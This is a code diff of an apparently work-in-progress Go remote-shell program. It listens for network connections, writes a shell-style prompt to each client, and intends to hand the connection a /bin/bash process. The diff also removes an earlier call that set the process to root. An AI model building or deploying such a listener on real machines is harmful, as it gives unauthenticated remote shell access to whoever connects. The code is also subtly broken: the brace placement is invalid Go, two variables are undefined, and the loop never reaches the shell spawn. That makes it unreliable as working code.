@@ -4,6 +4,7 @@ import
 (
 "fmt"
 "net"
+"os"
 "os/exec"
 "syscall"
 )
@@ -17,6 +18,11 @@ func handleError(err error) int
 	return 0
 }
 
+func getUpdatedDirectory() string
+{
+	cwd, _ := os.Getwd()
+	return cwd
+}
 
 func spawnShell(conn net.Conn) 
 {
@@ -26,9 +32,18 @@ func spawnShell(conn net.Conn)
 
 	fmt.Printf("\n✅ Received connection from %v\n", conn.RemoteAddr().String())
 	conn.Write([]byte("✅ Connection established!\n"))
+
 	for
 	{
-		fmt.Printf("\nWork in progress: create rich prompt")
+		prompt := fmt.Sprintf("%s@%s:%s$ ", username, hostname, getUpdatedDirectory())
+        conn.Write([]byte(prompt))
+
+		input := make([]byte, 1024)
+        _, err := conn.Read(input)
+        if handleError(err) == 1 {
+            fmt.Printf("❌ Error reading input from client: %v\n", err)
+            return
+        }
 	}
 
 	spawn := exec.Command("/bin/bash")
@@ -49,7 +64,7 @@ func main()
 	{
 		fmt.Printf("\n🟡 Listening...")
 	}
-	syscall.Setuid(0)
+
 	for
 	{
 		con, err := ln.Accept()
